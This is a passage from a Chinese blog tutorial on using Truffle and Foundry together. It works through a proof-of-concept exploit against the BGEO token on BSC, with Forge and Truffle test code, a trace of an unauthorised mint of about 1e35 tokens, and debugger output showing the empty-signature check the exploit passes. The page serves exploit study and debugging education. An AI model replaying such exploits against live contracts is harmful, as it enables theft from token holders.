+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+</span></span><span class="line"><span class="cl">pragma solidity ^0.8.10;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import &#34;../lib/forge-std/src/Test.sol&#34;;
+</span></span><span class="line"><span class="cl">import &#34;../contracts/POC.sol&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">contract TestPoC is Test {
+</span></span><span class="line"><span class="cl">    POC poc;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    function setUp() public {
+</span></span><span class="line"><span class="cl">        poc = new POC();
+</span></span><span class="line"><span class="cl">        vm.label(address(poc), &#34;POC&#34;);
+</span></span><span class="line"><span class="cl">        vm.label(address(this), &#34;this&#34;);
+</span></span><span class="line"><span class="cl">        vm.label(address(BGEO), &#34;BEGO&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    function testHack() public {
+</span></span><span class="line"><span class="cl">        uint256 balance = poc.hack();
+</span></span><span class="line"><span class="cl">        emit log_named_decimal_uint(&#34;balance i have&#34;, balance, 18);
+</span></span><span class="line"><span class="cl">        assertGt(balance, 0);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行测试：</p>
+<p>注： 在forge test 中可以用 -C指定测试程序路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">forge test -C &#34;test_forge/&#34; -vvvv
+</span></span><span class="line"><span class="cl">[⠰] Compiling...
+</span></span><span class="line"><span class="cl">[⠃] Compiling 1 files with 0.8.17
+</span></span><span class="line"><span class="cl">[⠊] Solc 0.8.17 finished in 1.46s
+</span></span><span class="line"><span class="cl">Compiler run successful!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Running 1 test for test_forge/poc.t.sol:TestPoC
+</span></span><span class="line"><span class="cl">[PASS] testHack() (gas: 69937)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  balance i have: 99999999999999999.000000000000000000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Traces:
+</span></span><span class="line"><span class="cl">  [69937] this::testHack() 
+</span></span><span class="line"><span class="cl">    ├─ [62491] POC::hack() 
+</span></span><span class="line"><span class="cl">    │   ├─ [55211] BEGO::mint(99999999999999999000000000000000000 [9.999e34], f����+����{)p��q�ub$!m(`�., POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [], [], []) 
+</span></span><span class="line"><span class="cl">    │   │   ├─ emit Transfer(param0: 0x0000000000000000000000000000000000000000, param1: POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 99999999999999999000000000000000000 [9.999e34])
+</span></span><span class="line"><span class="cl">    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
+</span></span><span class="line"><span class="cl">    │   ├─ [519] BEGO::balanceOf(POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+</span></span><span class="line"><span class="cl">    │   │   └─ ← 0x000000000000000000000000000000000013426172c74d821da6d934589c0000
+</span></span><span class="line"><span class="cl">    │   └─ ← 99999999999999999000000000000000000 [9.999e34]
+</span></span><span class="line"><span class="cl">    ├─ emit log_named_decimal_uint(key: balance i have, val: 99999999999999999000000000000000000 [9.999e34], decimals: 18)
+</span></span><span class="line"><span class="cl">    └─ ← ()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Test result: ok. 1 passed; 0 failed; finished in 24.17ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="truffle-test">truffle test</h3>
+<p>在test文件夹中创建truffle测试文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">truffle create test POC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">POC</span> <span class="o">=</span> <span class="nx">artifacts</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;POC&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">contract</span><span class="p">(</span><span class="s2">&#34;POC&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">accounts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Running test cases...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">it</span><span class="p">(</span><span class="s2">&#34;hack test&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">instance</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">POC</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">tx</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">hack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">tx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">assert</span><span class="p">(</span><span class="nx">tx</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">,</span> <span class="s2">&#34;Transaction should not be null&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">truffle test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">请确保合约已经部署，这和forge不一样
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">truffle test
+</span></span><span class="line"><span class="cl">Using network &#39;development&#39;.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Compiling your contracts...
+</span></span><span class="line"><span class="cl">===========================
+</span></span><span class="line"><span class="cl">&gt; Everything is up to date, there is nothing to compile.
+</span></span><span class="line"><span class="cl">Running test cases...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Contract: POC
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  tx: &#39;0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509&#39;,
+</span></span><span class="line"><span class="cl">  receipt: {
+</span></span><span class="line"><span class="cl">    transactionHash: &#39;0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509&#39;,
+</span></span><span class="line"><span class="cl">    transactionIndex: 0,
+</span></span><span class="line"><span class="cl">    blockNumber: 22315730,
+</span></span><span class="line"><span class="cl">    blockHash: &#39;0xf4fe2a264157abce7b43f2a98ea5bdc02190526c88caeee6f6ad2299057ed107&#39;,
+</span></span><span class="line"><span class="cl">    from: &#39;0x712517a5895fcd531e77a98f67b4517ed86baa4a&#39;,
+</span></span><span class="line"><span class="cl">    to: &#39;0x4f471b5ce39210b343800c94e8fcdcb97bee1db4&#39;,
+</span></span><span class="line"><span class="cl">    cumulativeGasUsed: 85959,
+</span></span><span class="line"><span class="cl">    gasUsed: 85959,
+</span></span><span class="line"><span class="cl">    contractAddress: null,
+</span></span><span class="line"><span class="cl">    logs: [],
+</span></span><span class="line"><span class="cl">    logsBloom: &#39;0x00000000000000000000001000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000020000000000000000000800000080000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000002000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000001000000000000080000000&#39;,
+</span></span><span class="line"><span class="cl">    status: true,
+</span></span><span class="line"><span class="cl">    effectiveGasPrice: 2501568968,
+</span></span><span class="line"><span class="cl">    type: &#39;0x2&#39;,
+</span></span><span class="line"><span class="cl">    rawLogs: [ [Object] ]
+</span></span><span class="line"><span class="cl">  },
+</span></span><span class="line"><span class="cl">  logs: []
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    ✔ hack test (3469ms)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  1 passing (4s)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="调试">调试</h2>
+<p>相比于forge test 中的用log进行打印来调试， truffle的debug功能就太强大了</p>
+<h3 id="调试tx">调试tx</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">truffle debug 0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509  -x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意最后的 <code>-x</code>选项 ，由于我们的代码引用了在bsc链上已经verfied的合约 <code>IBGEO20 constant BGEO = IBGEO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972) </code>  那么  <code>-x</code>选项 会去下载 改合约的代码以便调试了可以step into其代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">debug(development:0xd15318c7...)&gt; l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">BGeoToken.sol:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1241:     function checkSignParams(
+</span></span><span class="line"><span class="cl">1242:         bytes32[] memory _r,
+</span></span><span class="line"><span class="cl">1243:         bytes32[] memory _s,
+</span></span><span class="line"><span class="cl">1244:         uint8[] memory _v
+</span></span><span class="line"><span class="cl">1245:     ) private view returns (bool){
+</span></span><span class="line"><span class="cl">1246:         return (_r.length == _s.length) &amp;&amp; (_s.length == _v.length);
+</span></span><span class="line"><span class="cl">                      ^^^^^^^^^
+</span></span><span class="line"><span class="cl">1247:     }
+</span></span><span class="line"><span class="cl">1248:
+</span></span><span class="line"><span class="cl">1249:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">debug(development:0xd15318c7...)&gt; v
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Solidity built-ins:
+</span></span><span class="line"><span class="cl">    msg: {
+</span></span><span class="line"><span class="cl">           data: hex&#39;32a09b10000000000000000000000000000000000013426172c74d821da6d934589c000000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000004f471b5ce39210b343800c94e8fcdcb97bee1db40000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000020a662d2138624b3cefaa2ca8e4846882068dbbaa7dcd89541471754d2c50bb657000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;,
+</span></span><span class="line"><span class="cl">           sig: 0x32a09b10,
+</span></span><span class="line"><span class="cl">           sender: 0x4f471B5CE39210b343800c94e8fCDcB97bEe1DB4,
+</span></span><span class="line"><span class="cl">           value: 0
+</span></span><span class="line"><span class="cl">         }
+</span></span><span class="line"><span class="cl">     tx: {
+</span></span><span class="line"><span class="cl">           origin: 0x712517A5895fCD531E77A98F67b4517ED86BaA4a,
+</span></span><span class="line"><span class="cl">           gasprice: 2501568968
+</span></span><span class="line"><span class="cl">         }
+</span></span><span class="line"><span class="cl">  block: {
+</span></span><span class="line"><span class="cl">           coinbase: 0x0000000000000000000000000000000000000000,
+</span></span><span class="line"><span class="cl">           difficulty: 6137103538401385071974411046224224370499740472585752841626323261317793736621,
+</span></span><span class="line"><span class="cl">           gaslimit: 30000000,
+</span></span><span class="line"><span class="cl">           number: 22315730,
+</span></span><span class="line"><span class="cl">           timestamp: 1686295389
+</span></span><span class="line"><span class="cl">         }
+</span></span><span class="line"><span class="cl">   this: 0xc342774492b54ce5F8ac662113ED702Fc1b34972 (BGeoToken)
+</span></span><span class="line"><span class="cl">    now: 1686295389
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Contract variables:
+</span></span><span class="line"><span class="cl">   signers: {
+</span></span><span class="line"><span class="cl">              _inner: {
+</span></span><span class="line"><span class="cl">                _values: ?,
+</span></span><span class="line"><span class="cl">                _indexes: Map(0) {}
+</span></span><span class="line"><span class="cl">              }
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">       bsc: 0
+</span></span><span class="line"><span class="cl">  txHashes: Map(0) {}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Local variables:
+</span></span><span class="line"><span class="cl">  _r: []
+</span></span><span class="line"><span class="cl">  _s: []
+</span></span><span class="line"><span class="cl">  _v: []
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Note: Some storage variables could not be fully decoded; the debugger can only see storage it has seen touched during the transaction.
+</span></span><span class="line"><span class="cl">debug(development:0xd15318c7...)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="在test-case中加入调试">在test case中加入调试</h3>
+<p>在需要调试的语句上加上<code>debug()</code> 包装， 并且在truffle test 中加入<code>--debug</code>选项，就可以在改语句上执行调试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">POC</span> <span class="o">=</span> <span class="nx">artifacts</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;POC&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">contract</span><span class="p">(</span><span class="s2">&#34;POC&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">accounts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Running test cases...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">it</span><span class="p">(</span><span class="s2">&#34;hack test&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">instance</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">POC</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">tx</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">debug</span><span class="p">(</span><span class="nx">instance</span><span class="p">.</span><span class="nx">hack</span><span class="p">());</span> <span class="c1">// here, add debug(xxxx)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">tx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">assert</span><span class="p">(</span><span class="nx">tx</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">,</span> <span class="s2">&#34;Transaction should not be null&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">truffle test --debug
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注：truffle test &ndash;debug 没有  <code>-x</code>选项</p>
+<h3 id="调试合约的只读方法">调试合约的只读方法</h3>
+<p>TODO：</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-06-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/truffle_foundry_together/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://yinhui1984.github.io/truffle_foundry_together/" data-title="在一个项目中同时使用Truffle和Foundry" data-hashtags="L3,Web3.0"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/truffle_foundry_together/" data-hashtag="L3"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/truffle_foundry_together/" data-title="在一个项目中同时使用Truffle和Foundry"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://yinhui1984.github.io/truffle_foundry_together/" data-title="在一个项目中同时使用Truffle和Foundry"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/truffle_foundry_together/" data-title="在一个项目中同时使用Truffle和Foundry"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/l3/">L3</a>,&nbsp;<a href="/tags/web3.0/">Web3.0</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/binance-bgeo-attack-analysis/" class="prev" rel="prev" title="Binance BGEO Attack Analysis"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Binance BGEO Attack Analysis</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.113.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yinhui1984" target="_blank">zhouyinhui</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":2000},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
